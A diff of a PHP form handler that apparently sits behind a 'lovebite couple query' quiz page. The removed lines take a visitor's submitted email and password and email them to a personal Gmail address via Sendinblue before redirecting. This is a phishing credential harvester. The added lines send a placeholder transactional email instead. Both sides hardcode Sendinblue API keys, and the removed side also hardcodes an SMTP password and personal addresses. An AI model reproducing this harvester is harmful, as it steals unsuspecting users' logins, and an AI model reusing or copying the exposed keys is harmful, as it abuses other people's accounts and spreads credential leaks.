@@ -1,46 +1,45 @@
 <?php
 
-require_once 'vendor/autoload.php'; // Replace with the path to the Sendinblue API client library
+$curl = curl_init();
 
-// Create the Sendinblue client object
-$sendinblue = new Sendinblue\Client('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 ');
-
-// Set the SMTP configuration
-$config = Sendinblue\Configuration::getDefaultConfiguration()->setApiKey('api-key', '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 ');
-$config->setHost('smtp-relay.sendinblue.com');
-$config->setPort(587);
-$config->setEncryption('tls');
-$config->setUsername('nazmuzzaman.ifty13317@gmail.com');
-$config->setPassword('DnqUW78d91Ejh5mA');
-$email_number = $_POST['email_number'];
-$password = $_POST['password'];
-// Set the message parameters
-$to = array(array('email' => 'nazmuzzaman.ifty13317@gmail.com', 'name' => 'Your Name'));
-$from = array('email' => 'nazmuzzaman.ifty13317@gmail.com', 'name' => 'Sender Name');
-$subject = 'Form Submission';
-$htmlContent = '<p><b>New form submission:</b></p>';
-$htmlContent .= '<table>';
-$htmlContent .= '<tr><td>Email:</td><td>' . $_POST['email'] . '</td></tr>';
-$htmlContent .= '<tr><td>Password:</td><td>' . $_POST['password'] . '</td></tr>';
-$htmlContent .= '</table>';
-$textContent = 'New form submission: Email: ' . $_POST['email'] . ', Password: ' . $_POST['password'];
-
-// Create the message object
-$message = new Sendinblue\Model\SendSmtpEmail(array(
-    'to' => $to,
-    'replyTo' => $from,
-    'from' => $from,
-    'subject' => $subject,
-    'htmlContent' => $htmlContent,
-    'textContent' => $textContent
+curl_setopt_array($curl, array(
+  CURLOPT_URL => "https://api.sendinblue.com/v3/smtp/email",
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_ENCODING => "",
+  CURLOPT_MAXREDIRS => 10,
+  CURLOPT_TIMEOUT => 30,
+  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
+  CURLOPT_CUSTOMREQUEST => "POST",
+  CURLOPT_POSTFIELDS => '{  
+   "sender":{  
+      "name":"Sender Alex",
+      "email":"nazmuzzaman.ifty13317@gmail.com"
+   },
+   "to":[  
+      {  
+         "email":"home.info.learners@gmail.com",
+         "name":"John Doe"
+      }
+   ],
+   "subject":"Hello world",
+   "htmlContent":"<html><head></head><body><p>Hello,</p>This is my first transactional email sent from Sendinblue.</p></body></html>"
+}' 
 ));
 
-// Send the message
-try {
-    $result = $sendinblue->getSendSmtpEmailApi()->sendTransacEmail($message);
-    header('Location: https://love-ai.github.io/lovebite/couple%20query.html');
-} catch (Exception $e) {
-    echo 'Error: ' . $e->getMessage();
-}
+$headers = array();
+$headers[] = "Content-Type: application/json";
+$headers[] = "api-key: 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 "; // Replace YOUR_API_KEY with your actual API key
 
+curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
+
+$response = curl_exec($curl);
+$err = curl_error($curl);
+
+curl_close($curl);
+
+if ($err) {
+  echo "cURL Error #:" . $err;
+} else {
+  header("Location: https://github.com/love-ai/lovebite/blob/main/couple%20query.html");
+}
 ?>
